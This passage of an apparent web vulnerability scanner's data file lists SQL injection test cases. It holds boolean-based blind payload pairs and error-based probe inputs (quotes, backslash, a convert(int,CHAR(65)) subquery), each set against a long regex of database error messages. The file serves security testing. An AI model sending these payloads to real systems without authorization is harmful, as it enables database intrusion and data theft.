        "case_id": 1100020026,
        "use_orig_body" : "yes",
        "true_case" : ",(SELECT (CASE WHEN (num=num) THEN 1 ELSE 1/(SELECT 0) END))",
        "false_case" : ",(SELECT (CASE WHEN (num=num-1) THEN 1 ELSE 1/(SELECT 0) END))",
        "confirm_true_case" :  ",(SELECT (CASE WHEN (num-1=num-1) THEN 1 ELSE 1/(SELECT 0) END))",
        "confirm_false_case" : ",(SELECT (CASE WHEN (num=num+2) THEN 1 ELSE 1/(SELECT 0) END))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020027,
        "use_orig_body" : "yes",
        "true_case" : ",(SELECT (CASE WHEN (num=num) THEN val ELSE 1/(SELECT 0) END))",
        "false_case" : ",(SELECT (CASE WHEN (num=num-1) THEN val ELSE 1/(SELECT 0) END))",
        "confirm_true_case" :  ",(SELECT (CASE WHEN (num-1=num-1) THEN val ELSE 1/(SELECT 0) END))",
        "confirm_false_case" : ",(SELECT (CASE WHEN (num=num+2) THEN val ELSE 1/(SELECT 0) END))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020028,
        "use_orig_body" : "yes",
        "true_case" : ",(SELECT (CASE WHEN (num=num) THEN val ELSE 1/(SELECT 0) END))",
        "false_case" : ",(SELECT (CASE WHEN (num=num-1) THEN val ELSE 1/(SELECT 0) END))",
        "confirm_true_case" :  ",(SELECT (CASE WHEN (num-1=num-1) THEN val ELSE 1/(SELECT 0) END))",
        "confirm_false_case" : ",(SELECT (CASE WHEN (num=num+2) THEN val ELSE 1/(SELECT 0) END))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020065,
        "use_orig_body" : "yes",
        "true_case" : "' and 1=(case when(1=1 and num=num) then 1 else (select 1 union select 2) end) and 'a'='a",
        "false_case" : "' and 1=(case when(1=1 and num=num-1) then 1 else (select 1 union select 2) end) and 'a'='a",
        "confirm_true_case" :  "' and 1=(case when(1=1 and num-1=num-1) then 1 else (select 1 union select 2) end) and 'a'='a",
        "confirm_false_case" : "' and 1=(case when(1=1 and num=num+2) then 1 else (select 1 union select 2) end) and 'a'='a",
        "encode":  "YES",
    },

    {
        "case_id": 1100020030,
        "use_orig_body" : "yes",
        "true_case" : "' and 1=(case when(1=1 and num=num) then 1 else (select 1 union select 2) end) and 'a'='a",
        "false_case" : "' and 1=(case when(1=1 and num=num-1) then 1 else (select 1 union select 2) end) and 'a'='a",
        "confirm_true_case" :  "' and 1=(case when(1=1 and num-1=num-1) then 1 else (select 1 union select 2) end) and 'a'='a",
        "confirm_false_case" : "' and 1=(case when(1=1 and num=num+2) then 1 else (select 1 union select 2) end) and 'a'='a",
        "encode":  "YES",
    },

]


sql_inject_detect_err_msg_test_cases = [

    {
        "case_id": 1100020339,
        "target": "('[^']*'\\sis\\snull\\sor\\snot\\san\\sobject)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\) expects parameter \\d+ to be resource, \\w+ given in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\): supplied argument is not a valid MySQL result resource in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|(<b>Warning<\\/b>:\\s\\spg_exec\\(\\)\\s\\[\\<a\\shref='function.pg\\-exec'\\>function\\.pg-exec\\<\\/a>\\]\\:\\sQuery failed:\\sERROR:\\s\\ssyntax error at or near \\&quot\\;\\\\\\&quot; at character \\d+ in\\s<b>.*<\\/b>)|(<font style=\"COLOR: black; FONT: 8pt\\/11pt verdana\">\\s+(\\[Macromedia\\]\\[SQLServer\\sJDBC\\sDriver\\]\\[SQLServer\\]|Syntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s))|(<font\\sface=\"Arial\"\\ssize=2>Syntax\\serror\\s(.*)?in\\squery\\sexpression\\s'(.*)\\.<\\/font>)|(<h2>\\s<i>Syntax\\serror\\s(\\([^)]*\\))?(in\\sstring)?\\sin\\squery\\sexpression\\s'[^\\.]*\\.<\\/i>\\s<\\/h2><\\/span>)|(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')|(Incorrect\\ssyntax\\snear\\s'[^']*')|(Microsoft\\sJET\\sDatabase\\sEngine\\s\\([^\\)]*\\)<br>Syntax\\serror(.*)\\sin\\squery\\sexpression\\s'.*\\.<br><b>.*,\\sline\\s\\d+<\\/b><br>)|(ORA-\\d{4,5}:\\s)|(Query\\sfailed\\:\\sERROR\\:\\s+unterminated quoted string at or near)|(Query\\sfailed\\:\\sERROR\\:\\scolumn\\s\"[^\"]*\"\\sdoes\\snot\\sexist\\sLINE\\s\\d)|(Syntax error: Missing operand after '[^']*' operator)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\s\\([^)]*?\\)\\sin\\squery\\sexpression\\s.*)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s)|(The string constant beginning with .*? does not have an ending string delimiter\\.)|(Unclosed\\squotation\\smark\\safter\\sthe\\scharacter\\sstring\\s'[^']*')|(Unknown column '[^']+' in '\\w+ clause')|(You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[^']*' at line \\d)|(pg_query\\(\\)[:]*\\squery\\sfailed:\\serror:\\s)|(<b>SQL error: <\\/b> no such column)|(<title>Conversion failed when converting the varchar value 'A' to data type int.<\\/title>)|(Call to a member function row_array() on a non-object in)|(Can't find record in)|(Column count doesn't match value count at row)|(ERROR: parser: parse error at or near)|(Error Executing Database Query)|(Error: 221 Invalid formula)|(Incorrect column name)|(Incorrect column specifier for column)|(Incorrect syntax near)|(Invalid SQL:)|(Invalid column name)|(Microsoft OLE DB Provider for ODBC Drivers)|(Microsoft OLE DB Provider for SQL Server)|(Must declare the scalar variable)|(ODBC Microsoft Access Driver)|(ODBC SQL Server Driver)|(PostgreSQL query failed)|(SQL command not properly ended)|(SQLSTATE=42603)|(SQLite3::SQLException:)|(SQLite3::query(): Unable to prepare statement:)|(SqlException)|(Supplied argument is not a valid PostgreSQL result)|(Syntax error in string in query expression)|(Syntax error near\\s.*?\\sin the full-text search condition\\s)|(Syntax error or access violation:)|(System.Data.SqlClient.SqlException:)|(Unclosed quotation mark before the character string)|(Unclosed quotation mark)|(Unexpected end of command in statement \\[)|(Unknown system variable)|(Unknown table)|(You have an error in your SQL syntax)|(\\): encountered SQLException \\[)|(\\[Microsoft\\]\\[ODBC Microsoft Access 97 Driver\\])|(\\[ODBC Informix driver\\]\\[Informix\\])|(\\[SQL Server Driver\\]\\[SQL Server\\]Line 1: Incorrect syntax near)|(column \"\\w{5}\" does not exist)|(internal error \\[IBM\\]\\[CLI Driver\\]\\[DB2\\/6000\\])|(java.sql.SQLSyntaxErrorException)|(near\\s[^:]+?:\\ssyntax\\serror)|(org.hibernate.QueryException)|(org.hibernate.exception.SQLGrammarException:)|(pg_fetch_row() expects parameter 1 to be resource, boolean given in)|(supplied argument is not a valid MySQL result)|(syntax error at end of input)|(unexpected end of SQL command)|(unrecognized token:)|(unterminated quoted identifier at or near)|(unterminated quoted string at or near)",
        "input": "xbf'xbf\"",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020338,
        "target": "('[^']*'\\sis\\snull\\sor\\snot\\san\\sobject)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\) expects parameter \\d+ to be resource, \\w+ given in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\): supplied argument is not a valid MySQL result resource in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|(<b>Warning<\\/b>:\\s\\spg_exec\\(\\)\\s\\[\\<a\\shref='function.pg\\-exec'\\>function\\.pg-exec\\<\\/a>\\]\\:\\sQuery failed:\\sERROR:\\s\\ssyntax error at or near \\&quot\\;\\\\\\&quot; at character \\d+ in\\s<b>.*<\\/b>)|(<font style=\"COLOR: black; FONT: 8pt\\/11pt verdana\">\\s+(\\[Macromedia\\]\\[SQLServer\\sJDBC\\sDriver\\]\\[SQLServer\\]|Syntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s))|(<font\\sface=\"Arial\"\\ssize=2>Syntax\\serror\\s(.*)?in\\squery\\sexpression\\s'(.*)\\.<\\/font>)|(<h2>\\s<i>Syntax\\serror\\s(\\([^)]*\\))?(in\\sstring)?\\sin\\squery\\sexpression\\s'[^\\.]*\\.<\\/i>\\s<\\/h2><\\/span>)|(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')|(Incorrect\\ssyntax\\snear\\s'[^']*')|(Microsoft\\sJET\\sDatabase\\sEngine\\s\\([^\\)]*\\)<br>Syntax\\serror(.*)\\sin\\squery\\sexpression\\s'.*\\.<br><b>.*,\\sline\\s\\d+<\\/b><br>)|(ORA-\\d{4,5}:\\s)|(Query\\sfailed\\:\\sERROR\\:\\s+unterminated quoted string at or near)|(Query\\sfailed\\:\\sERROR\\:\\scolumn\\s\"[^\"]*\"\\sdoes\\snot\\sexist\\sLINE\\s\\d)|(Syntax error: Missing operand after '[^']*' operator)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\s\\([^)]*?\\)\\sin\\squery\\sexpression\\s.*)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s)|(The string constant beginning with .*? does not have an ending string delimiter\\.)|(Unclosed\\squotation\\smark\\safter\\sthe\\scharacter\\sstring\\s'[^']*')|(Unknown column '[^']+' in '\\w+ clause')|(You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[^']*' at line \\d)|(pg_query\\(\\)[:]*\\squery\\sfailed:\\serror:\\s)|(<b>SQL error: <\\/b> no such column)|(<title>Conversion failed when converting the varchar value 'A' to data type int.<\\/title>)|(Call to a member function row_array() on a non-object in)|(Can't find record in)|(Column count doesn't match value count at row)|(ERROR: parser: parse error at or near)|(Error Executing Database Query)|(Error: 221 Invalid formula)|(Incorrect column name)|(Incorrect column specifier for column)|(Incorrect syntax near)|(Invalid SQL:)|(Invalid column name)|(Microsoft OLE DB Provider for ODBC Drivers)|(Microsoft OLE DB Provider for SQL Server)|(Must declare the scalar variable)|(ODBC Microsoft Access Driver)|(ODBC SQL Server Driver)|(PostgreSQL query failed)|(SQL command not properly ended)|(SQLSTATE=42603)|(SQLite3::SQLException:)|(SQLite3::query(): Unable to prepare statement:)|(SqlException)|(Supplied argument is not a valid PostgreSQL result)|(Syntax error in string in query expression)|(Syntax error near\\s.*?\\sin the full-text search condition\\s)|(Syntax error or access violation:)|(System.Data.SqlClient.SqlException:)|(Unclosed quotation mark before the character string)|(Unclosed quotation mark)|(Unexpected end of command in statement \\[)|(Unknown system variable)|(Unknown table)|(You have an error in your SQL syntax)|(\\): encountered SQLException \\[)|(\\[Microsoft\\]\\[ODBC Microsoft Access 97 Driver\\])|(\\[ODBC Informix driver\\]\\[Informix\\])|(\\[SQL Server Driver\\]\\[SQL Server\\]Line 1: Incorrect syntax near)|(column \"\\w{5}\" does not exist)|(internal error \\[IBM\\]\\[CLI Driver\\]\\[DB2\\/6000\\])|(java.sql.SQLSyntaxErrorException)|(near\\s[^:]+?:\\ssyntax\\serror)|(org.hibernate.QueryException)|(org.hibernate.exception.SQLGrammarException:)|(pg_fetch_row() expects parameter 1 to be resource, boolean given in)|(supplied argument is not a valid MySQL result)|(syntax error at end of input)|(unexpected end of SQL command)|(unrecognized token:)|(unterminated quoted identifier at or near)|(unterminated quoted string at or near)",
        "input": "xF0x27x27xF0x22x22",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020337,
        "target": "('[^']*'\\sis\\snull\\sor\\snot\\san\\sobject)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\) expects parameter \\d+ to be resource, \\w+ given in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\): supplied argument is not a valid MySQL result resource in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|(<b>Warning<\\/b>:\\s\\spg_exec\\(\\)\\s\\[\\<a\\shref='function.pg\\-exec'\\>function\\.pg-exec\\<\\/a>\\]\\:\\sQuery failed:\\sERROR:\\s\\ssyntax error at or near \\&quot\\;\\\\\\&quot; at character \\d+ in\\s<b>.*<\\/b>)|(<font style=\"COLOR: black; FONT: 8pt\\/11pt verdana\">\\s+(\\[Macromedia\\]\\[SQLServer\\sJDBC\\sDriver\\]\\[SQLServer\\]|Syntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s))|(<font\\sface=\"Arial\"\\ssize=2>Syntax\\serror\\s(.*)?in\\squery\\sexpression\\s'(.*)\\.<\\/font>)|(<h2>\\s<i>Syntax\\serror\\s(\\([^)]*\\))?(in\\sstring)?\\sin\\squery\\sexpression\\s'[^\\.]*\\.<\\/i>\\s<\\/h2><\\/span>)|(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')|(Incorrect\\ssyntax\\snear\\s'[^']*')|(Microsoft\\sJET\\sDatabase\\sEngine\\s\\([^\\)]*\\)<br>Syntax\\serror(.*)\\sin\\squery\\sexpression\\s'.*\\.<br><b>.*,\\sline\\s\\d+<\\/b><br>)|(ORA-\\d{4,5}:\\s)|(Query\\sfailed\\:\\sERROR\\:\\s+unterminated quoted string at or near)|(Query\\sfailed\\:\\sERROR\\:\\scolumn\\s\"[^\"]*\"\\sdoes\\snot\\sexist\\sLINE\\s\\d)|(Syntax error: Missing operand after '[^']*' operator)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\s\\([^)]*?\\)\\sin\\squery\\sexpression\\s.*)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s)|(The string constant beginning with .*? does not have an ending string delimiter\\.)|(Unclosed\\squotation\\smark\\safter\\sthe\\scharacter\\sstring\\s'[^']*')|(Unknown column '[^']+' in '\\w+ clause')|(You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[^']*' at line \\d)|(pg_query\\(\\)[:]*\\squery\\sfailed:\\serror:\\s)|(<b>SQL error: <\\/b> no such column)|(<title>Conversion failed when converting the varchar value 'A' to data type int.<\\/title>)|(Call to a member function row_array() on a non-object in)|(Can't find record in)|(Column count doesn't match value count at row)|(ERROR: parser: parse error at or near)|(Error Executing Database Query)|(Error: 221 Invalid formula)|(Incorrect column name)|(Incorrect column specifier for column)|(Incorrect syntax near)|(Invalid SQL:)|(Invalid column name)|(Microsoft OLE DB Provider for ODBC Drivers)|(Microsoft OLE DB Provider for SQL Server)|(Must declare the scalar variable)|(ODBC Microsoft Access Driver)|(ODBC SQL Server Driver)|(PostgreSQL query failed)|(SQL command not properly ended)|(SQLSTATE=42603)|(SQLite3::SQLException:)|(SQLite3::query(): Unable to prepare statement:)|(SqlException)|(Supplied argument is not a valid PostgreSQL result)|(Syntax error in string in query expression)|(Syntax error near\\s.*?\\sin the full-text search condition\\s)|(Syntax error or access violation:)|(System.Data.SqlClient.SqlException:)|(Unclosed quotation mark before the character string)|(Unclosed quotation mark)|(Unexpected end of command in statement \\[)|(Unknown system variable)|(Unknown table)|(You have an error in your SQL syntax)|(\\): encountered SQLException \\[)|(\\[Microsoft\\]\\[ODBC Microsoft Access 97 Driver\\])|(\\[ODBC Informix driver\\]\\[Informix\\])|(\\[SQL Server Driver\\]\\[SQL Server\\]Line 1: Incorrect syntax near)|(column \"\\w{5}\" does not exist)|(internal error \\[IBM\\]\\[CLI Driver\\]\\[DB2\\/6000\\])|(java.sql.SQLSyntaxErrorException)|(near\\s[^:]+?:\\ssyntax\\serror)|(org.hibernate.QueryException)|(org.hibernate.exception.SQLGrammarException:)|(pg_fetch_row() expects parameter 1 to be resource, boolean given in)|(supplied argument is not a valid MySQL result)|(syntax error at end of input)|(unexpected end of SQL command)|(unrecognized token:)|(unterminated quoted identifier at or near)|(unterminated quoted string at or near)",
        "input": "\\",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020336,
        "target": "('[^']*'\\sis\\snull\\sor\\snot\\san\\sobject)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\) expects parameter \\d+ to be resource, \\w+ given in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\): supplied argument is not a valid MySQL result resource in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|(<b>Warning<\\/b>:\\s\\spg_exec\\(\\)\\s\\[\\<a\\shref='function.pg\\-exec'\\>function\\.pg-exec\\<\\/a>\\]\\:\\sQuery failed:\\sERROR:\\s\\ssyntax error at or near \\&quot\\;\\\\\\&quot; at character \\d+ in\\s<b>.*<\\/b>)|(<font style=\"COLOR: black; FONT: 8pt\\/11pt verdana\">\\s+(\\[Macromedia\\]\\[SQLServer\\sJDBC\\sDriver\\]\\[SQLServer\\]|Syntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s))|(<font\\sface=\"Arial\"\\ssize=2>Syntax\\serror\\s(.*)?in\\squery\\sexpression\\s'(.*)\\.<\\/font>)|(<h2>\\s<i>Syntax\\serror\\s(\\([^)]*\\))?(in\\sstring)?\\sin\\squery\\sexpression\\s'[^\\.]*\\.<\\/i>\\s<\\/h2><\\/span>)|(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')|(Incorrect\\ssyntax\\snear\\s'[^']*')|(Microsoft\\sJET\\sDatabase\\sEngine\\s\\([^\\)]*\\)<br>Syntax\\serror(.*)\\sin\\squery\\sexpression\\s'.*\\.<br><b>.*,\\sline\\s\\d+<\\/b><br>)|(ORA-\\d{4,5}:\\s)|(Query\\sfailed\\:\\sERROR\\:\\s+unterminated quoted string at or near)|(Query\\sfailed\\:\\sERROR\\:\\scolumn\\s\"[^\"]*\"\\sdoes\\snot\\sexist\\sLINE\\s\\d)|(Syntax error: Missing operand after '[^']*' operator)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\s\\([^)]*?\\)\\sin\\squery\\sexpression\\s.*)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s)|(The string constant beginning with .*? does not have an ending string delimiter\\.)|(Unclosed\\squotation\\smark\\safter\\sthe\\scharacter\\sstring\\s'[^']*')|(Unknown column '[^']+' in '\\w+ clause')|(You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[^']*' at line \\d)|(pg_query\\(\\)[:]*\\squery\\sfailed:\\serror:\\s)|(<b>SQL error: <\\/b> no such column)|(<title>Conversion failed when converting the varchar value 'A' to data type int.<\\/title>)|(Call to a member function row_array() on a non-object in)|(Can't find record in)|(Column count doesn't match value count at row)|(ERROR: parser: parse error at or near)|(Error Executing Database Query)|(Error: 221 Invalid formula)|(Incorrect column name)|(Incorrect column specifier for column)|(Incorrect syntax near)|(Invalid SQL:)|(Invalid column name)|(Microsoft OLE DB Provider for ODBC Drivers)|(Microsoft OLE DB Provider for SQL Server)|(Must declare the scalar variable)|(ODBC Microsoft Access Driver)|(ODBC SQL Server Driver)|(PostgreSQL query failed)|(SQL command not properly ended)|(SQLSTATE=42603)|(SQLite3::SQLException:)|(SQLite3::query(): Unable to prepare statement:)|(SqlException)|(Supplied argument is not a valid PostgreSQL result)|(Syntax error in string in query expression)|(Syntax error near\\s.*?\\sin the full-text search condition\\s)|(Syntax error or access violation:)|(System.Data.SqlClient.SqlException:)|(Unclosed quotation mark before the character string)|(Unclosed quotation mark)|(Unexpected end of command in statement \\[)|(Unknown system variable)|(Unknown table)|(You have an error in your SQL syntax)|(\\): encountered SQLException \\[)|(\\[Microsoft\\]\\[ODBC Microsoft Access 97 Driver\\])|(\\[ODBC Informix driver\\]\\[Informix\\])|(\\[SQL Server Driver\\]\\[SQL Server\\]Line 1: Incorrect syntax near)|(column \"\\w{5}\" does not exist)|(internal error \\[IBM\\]\\[CLI Driver\\]\\[DB2\\/6000\\])|(java.sql.SQLSyntaxErrorException)|(near\\s[^:]+?:\\ssyntax\\serror)|(org.hibernate.QueryException)|(org.hibernate.exception.SQLGrammarException:)|(pg_fetch_row() expects parameter 1 to be resource, boolean given in)|(supplied argument is not a valid MySQL result)|(syntax error at end of input)|(unexpected end of SQL command)|(unrecognized token:)|(unterminated quoted identifier at or near)|(unterminated quoted string at or near)",
        "input": "JyI=",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020330,
        "target": "('[^']*'\\sis\\snull\\sor\\snot\\san\\sobject)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\) expects parameter \\d+ to be resource, \\w+ given in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\): supplied argument is not a valid MySQL result resource in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|(<b>Warning<\\/b>:\\s\\spg_exec\\(\\)\\s\\[\\<a\\shref='function.pg\\-exec'\\>function\\.pg-exec\\<\\/a>\\]\\:\\sQuery failed:\\sERROR:\\s\\ssyntax error at or near \\&quot\\;\\\\\\&quot; at character \\d+ in\\s<b>.*<\\/b>)|(<font style=\"COLOR: black; FONT: 8pt\\/11pt verdana\">\\s+(\\[Macromedia\\]\\[SQLServer\\sJDBC\\sDriver\\]\\[SQLServer\\]|Syntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s))|(<font\\sface=\"Arial\"\\ssize=2>Syntax\\serror\\s(.*)?in\\squery\\sexpression\\s'(.*)\\.<\\/font>)|(<h2>\\s<i>Syntax\\serror\\s(\\([^)]*\\))?(in\\sstring)?\\sin\\squery\\sexpression\\s'[^\\.]*\\.<\\/i>\\s<\\/h2><\\/span>)|(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')|(Incorrect\\ssyntax\\snear\\s'[^']*')|(Microsoft\\sJET\\sDatabase\\sEngine\\s\\([^\\)]*\\)<br>Syntax\\serror(.*)\\sin\\squery\\sexpression\\s'.*\\.<br><b>.*,\\sline\\s\\d+<\\/b><br>)|(ORA-\\d{4,5}:\\s)|(Query\\sfailed\\:\\sERROR\\:\\s+unterminated quoted string at or near)|(Query\\sfailed\\:\\sERROR\\:\\scolumn\\s\"[^\"]*\"\\sdoes\\snot\\sexist\\sLINE\\s\\d)|(Syntax error: Missing operand after '[^']*' operator)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\s\\([^)]*?\\)\\sin\\squery\\sexpression\\s.*)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s)|(The string constant beginning with .*? does not have an ending string delimiter\\.)|(Unclosed\\squotation\\smark\\safter\\sthe\\scharacter\\sstring\\s'[^']*')|(Unknown column '[^']+' in '\\w+ clause')|(You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[^']*' at line \\d)|(pg_query\\(\\)[:]*\\squery\\sfailed:\\serror:\\s)|(<b>SQL error: <\\/b> no such column)|(<title>Conversion failed when converting the varchar value 'A' to data type int.<\\/title>)|(Call to a member function row_array() on a non-object in)|(Can't find record in)|(Column count doesn't match value count at row)|(ERROR: parser: parse error at or near)|(Error Executing Database Query)|(Error: 221 Invalid formula)|(Incorrect column name)|(Incorrect column specifier for column)|(Incorrect syntax near)|(Invalid SQL:)|(Invalid column name)|(Microsoft OLE DB Provider for ODBC Drivers)|(Microsoft OLE DB Provider for SQL Server)|(Must declare the scalar variable)|(ODBC Microsoft Access Driver)|(ODBC SQL Server Driver)|(PostgreSQL query failed)|(SQL command not properly ended)|(SQLSTATE=42603)|(SQLite3::SQLException:)|(SQLite3::query(): Unable to prepare statement:)|(SqlException)|(Supplied argument is not a valid PostgreSQL result)|(Syntax error in string in query expression)|(Syntax error near\\s.*?\\sin the full-text search condition\\s)|(Syntax error or access violation:)|(System.Data.SqlClient.SqlException:)|(Unclosed quotation mark before the character string)|(Unclosed quotation mark)|(Unexpected end of command in statement \\[)|(Unknown system variable)|(Unknown table)|(You have an error in your SQL syntax)|(\\): encountered SQLException \\[)|(\\[Microsoft\\]\\[ODBC Microsoft Access 97 Driver\\])|(\\[ODBC Informix driver\\]\\[Informix\\])|(\\[SQL Server Driver\\]\\[SQL Server\\]Line 1: Incorrect syntax near)|(column \"\\w{5}\" does not exist)|(internal error \\[IBM\\]\\[CLI Driver\\]\\[DB2\\/6000\\])|(java.sql.SQLSyntaxErrorException)|(near\\s[^:]+?:\\ssyntax\\serror)|(org.hibernate.QueryException)|(org.hibernate.exception.SQLGrammarException:)|(pg_fetch_row() expects parameter 1 to be resource, boolean given in)|(supplied argument is not a valid MySQL result)|(syntax error at end of input)|(unexpected end of SQL command)|(unrecognized token:)|(unterminated quoted identifier at or near)|(unterminated quoted string at or near)",
        "input": "(select convert(int,CHAR(65)))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020331,
        "target": "('[^']*'\\sis\\snull\\sor\\snot\\san\\sobject)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\) expects parameter \\d+ to be resource, \\w+ given in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\): supplied argument is not a valid MySQL result resource in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|(<b>Warning<\\/b>:\\s\\spg_exec\\(\\)\\s\\[\\<a\\shref='function.pg\\-exec'\\>function\\.pg-exec\\<\\/a>\\]\\:\\sQuery failed:\\sERROR:\\s\\ssyntax error at or near \\&quot\\;\\\\\\&quot; at character \\d+ in\\s<b>.*<\\/b>)|(<font style=\"COLOR: black; FONT: 8pt\\/11pt verdana\">\\s+(\\[Macromedia\\]\\[SQLServer\\sJDBC\\sDriver\\]\\[SQLServer\\]|Syntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s))|(<font\\sface=\"Arial\"\\ssize=2>Syntax\\serror\\s(.*)?in\\squery\\sexpression\\s'(.*)\\.<\\/font>)|(<h2>\\s<i>Syntax\\serror\\s(\\([^)]*\\))?(in\\sstring)?\\sin\\squery\\sexpression\\s'[^\\.]*\\.<\\/i>\\s<\\/h2><\\/span>)|(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')|(Incorrect\\ssyntax\\snear\\s'[^']*')|(Microsoft\\sJET\\sDatabase\\sEngine\\s\\([^\\)]*\\)<br>Syntax\\serror(.*)\\sin\\squery\\sexpression\\s'.*\\.<br><b>.*,\\sline\\s\\d+<\\/b><br>)|(ORA-\\d{4,5}:\\s)|(Query\\sfailed\\:\\sERROR\\:\\s+unterminated quoted string at or near)|(Query\\sfailed\\:\\sERROR\\:\\scolumn\\s\"[^\"]*\"\\sdoes\\snot\\sexist\\sLINE\\s\\d)|(Syntax error: Missing operand after '[^']*' operator)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\s\\([^)]*?\\)\\sin\\squery\\sexpression\\s.*)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s)|(The string constant beginning with .*? does not have an ending string delimiter\\.)|(Unclosed\\squotation\\smark\\safter\\sthe\\scharacter\\sstring\\s'[^']*')|(Unknown column '[^']+' in '\\w+ clause')|(You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[^']*' at line \\d)|(pg_query\\(\\)[:]*\\squery\\sfailed:\\serror:\\s)|(<b>SQL error: <\\/b> no such column)|(<title>Conversion failed when converting the varchar value 'A' to data type int.<\\/title>)|(Call to a member function row_array() on a non-object in)|(Can't find record in)|(Column count doesn't match value count at row)|(ERROR: parser: parse error at or near)|(Error Executing Database Query)|(Error: 221 Invalid formula)|(Incorrect column name)|(Incorrect column specifier for column)|(Incorrect syntax near)|(Invalid SQL:)|(Invalid column name)|(Microsoft OLE DB Provider for ODBC Drivers)|(Microsoft OLE DB Provider for SQL Server)|(Must declare the 